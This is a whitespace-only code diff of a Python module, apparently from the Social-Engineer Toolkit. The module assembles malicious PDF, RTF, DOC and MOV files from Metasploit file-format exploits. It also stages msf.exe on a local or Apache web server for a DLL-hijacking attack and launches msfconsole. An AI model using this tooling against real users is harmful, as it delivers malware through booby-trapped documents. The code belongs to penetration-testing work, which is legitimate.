@@ -17,7 +17,7 @@ definepath=os.getcwd()
 define_version = get_version()
 users_home = os.getenv("HOME")
 
-# metasploit path 
+# metasploit path
 meta_path=meta_path()
 
 # define if we need apache or not for dll hijacking
@@ -45,7 +45,7 @@ for line in apache_check:
 
 ###################################################
 #        USER INPUT: SHOW PAYLOAD MENU            #
-###################################################   
+###################################################
 inputpdf=""
 target=""
 exploit = "INVALID"
@@ -69,14 +69,14 @@ while exploit == "INVALID":
     if exploit == '3':     #'Microsoft Windows CreateSizedDIBSECTION Stack Buffer Overflow'
         outfile=("template.doc")
 
-    if exploit == '4':     #'Microsoft Word RTF pFragments Stack Buffer Overflow (MS10-087)' 
+    if exploit == '4':     #'Microsoft Word RTF pFragments Stack Buffer Overflow (MS10-087)'
         outfile=("template.rtf")
         target=("TARGET=1")
 
     if exploit == "5":
         outfile = ("template.mov")
 
-    if exploit != '3' and exploit != '4' and exploit !="17": 
+    if exploit != '3' and exploit != '4' and exploit !="17":
         outfile=("template.pdf")
 
 
@@ -89,18 +89,18 @@ while exploit == "INVALID":
         time.sleep(2)
 
 # 'exploit' has been converted to the string by now, so we need to
-#  evaluate the string instead of the user input number from here on... 
+#  evaluate the string instead of the user input number from here on...
 if exploit == "exploit/windows/fileformat/adobe_pdf_embedded_exe" or exploit == "exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs":
     print_info("Default payload creation selected. SET will generate a normal PDF with embedded EXE.")
     print """
     1. Use your own PDF for attack
     2. Use built-in BLANK PDF for attack\n"""
-    
+
     choicepdf = raw_input(setprompt(["4"], ""))
-    
+
     if choicepdf == 'exit':
         exit_set()
-    
+
     if choicepdf == '1':
         # define if user wants to use their own pdf or built in one
         inputpdf=raw_input(setprompt(["4"], "Enter path to your pdf [blank-builtin]"))
@@ -129,24 +129,24 @@ if exploit == "dll_hijacking" or exploit == "unc_embed":
     exploit_counter=1
 
 if exploit_counter == 0:
-    
+
     ###################################################
     #        USER INPUT: SHOW PAYLOAD MENU 3          #
-    ###################################################   
+    ###################################################
     debug_msg(me,"printing 'src.core.menu.text.payload_menu_3'",5)
     show_payload_menu3 = create_menu(payload_menu_3_text, payload_menu_3)
     payload=raw_input(setprompt(["4"], ""))
     noencode=0
-    
+
     if payload == 'exit':
         exit_set()
-    
-    if payload == "" : payload="2" 
+
+    if payload == "" : payload="2"
     if payload == '4' or payload == '5' or payload == '6':
         noencode=1
- 
+
     payload=ms_payload_3(payload)
-    
+
 
     # imported from central, grabs ip address
     rhost=grab_ipaddress()
@@ -237,17 +237,17 @@ if exploit == "dll_hijacking":
     if apache == 0:
         if not os.path.isfile("%s/src/program_junk/fileformat.file" % (definepath)):
     #        try:
-                filewrite=file("src/program_junk/attack_vector","w")
-                filewrite.write("hijacking")
-                filewrite.close()
-                filewrite=file("src/program_junk/site.template","w")
-                filewrite.write("TEMPLATE=CUSTOM")
-                filewrite.close()
-                time.sleep(1)
-                subprocess.Popen("mkdir src/program_junk/web_clone;cp src/html/msf.exe src/program_junk/web_clone/x", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
-                child=pexpect.spawn("python src/html/web_server.py")
+            filewrite=file("src/program_junk/attack_vector","w")
+            filewrite.write("hijacking")
+            filewrite.close()
+            filewrite=file("src/program_junk/site.template","w")
+            filewrite.write("TEMPLATE=CUSTOM")
+            filewrite.close()
+            time.sleep(1)
+            subprocess.Popen("mkdir src/program_junk/web_clone;cp src/html/msf.exe src/program_junk/web_clone/x", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+            child=pexpect.spawn("python src/html/web_server.py")
     #        except: child.close()
-    # if we are using apache    
+    # if we are using apache
     if apache == 1:
         subprocess.Popen("cp src/html/msf.exe %s/x.exe" % (apache_path), shell=True).wait()
 
@@ -257,7 +257,7 @@ if exploit == "dll_hijacking":
             print_info("This may take a few to load MSF...")
             try:
                 child1=pexpect.spawn("ruby %s/msfconsole -L -n -r src/program_junk/meta_config" % (meta_path))
-            except: 
+            except:
                 try:
                     child1.close()
                 except: pass
@@ -271,7 +271,7 @@ if exploit == "dll_hijacking":
         except: import smtp_client
         try:
             child1.interact()
-        except: 
+        except:
             if apache == 0:
                 try:
                     child.close()
